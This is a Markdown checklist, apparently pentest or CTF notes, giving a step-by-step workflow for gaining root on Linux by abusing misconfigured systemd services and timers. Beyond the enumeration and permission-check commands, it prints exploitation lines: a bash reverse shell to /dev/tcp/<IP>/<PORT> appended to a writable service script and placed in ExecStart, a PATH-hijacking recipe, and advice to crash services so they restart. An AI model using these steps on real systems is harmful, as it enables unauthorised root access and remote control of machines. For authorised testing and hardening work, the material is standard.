# Linux Privilege Escalation – Systemd Units

## Purpose

This file provides a structured workflow for identifying and exploiting misconfigured systemd services.

Core rules:

* systemd services often run as root
* Writable unit files or scripts = privilege escalation
* Service restart = execution trigger
* Always inspect ExecStart

---

## 0. List Systemd Services (CRITICAL FIRST STEP)

```bash id="k2f4m9"
systemctl list-units --type=service
```

---

## 1. Identify Custom / Interesting Services

Look for:

* non-standard names
* services in /opt or /home
* development-related services

---

## 2. Inspect Service File

```bash id="w7n3x1"
systemctl status <service>
```

```bash id="m9c2z8"
systemctl cat <service>
```

---

## 3. Locate Unit File

Common locations:

```text id="8y4zq2"
/etc/systemd/system/
/lib/systemd/system/
/usr/lib/systemd/system/
```

---

## 4. Check Permissions (CRITICAL)

```bash id="z1x5v3"
ls -la /path/to/service.service
```

If writable:
→ direct privilege escalation

---

## 5. Check ExecStart

Example:

```text id="c6t9k1"
ExecStart=/usr/local/bin/script.sh
```

---

## 6. Check Script Permissions

```bash id="y4n2v8"
ls -la /usr/local/bin/script.sh
```

If writable:
→ modify script

---

## 7. Exploit Writable Script

```bash id="p8k3m7"
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> script.sh
```

---

## 8. Restart Service

```bash id="r2x9w4"
sudo systemctl restart <service>
```

OR wait for automatic restart

---

## 9. Writable Unit File

If service file writable:

Modify:

```bash id="g5z8k2"
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Reload:

```bash id="n3v7c1"
systemctl daemon-reload
systemctl restart <service>
```

---

## 10. Environment Variable Abuse

Check for:

```text id="v7q1x3"
Environment=
EnvironmentFile=
```

If writable:
→ inject malicious values

---

## 11. PATH Hijacking

If ExecStart uses relative paths:

Exploit:

```bash id="d4m8k9"
echo "/bin/bash" > fake_binary
chmod +x fake_binary
export PATH=.:$PATH
```

---

## 12. Timers (IMPORTANT)

Check:

```bash id="k8z1m2"
systemctl list-timers
```

Timers may trigger services automatically.

---

## 13. Check Logs

```bash id="h3p7v6"
journalctl -u <service>
```

---

## 14. If No Restart Access

Try:

* wait for timer
* crash service
* trigger reload

---

## 15. If Stuck

RESET:

* re-check permissions
* inspect ExecStart again
* check related scripts
* check timers

---

## 16. Mental Model

* systemd = root execution engine
* service = execution path
* writable file = control

---

## 17. Golden Rules

* Always inspect systemctl services
* Always check ExecStart
* Always check script permissions
* Always look for writable files
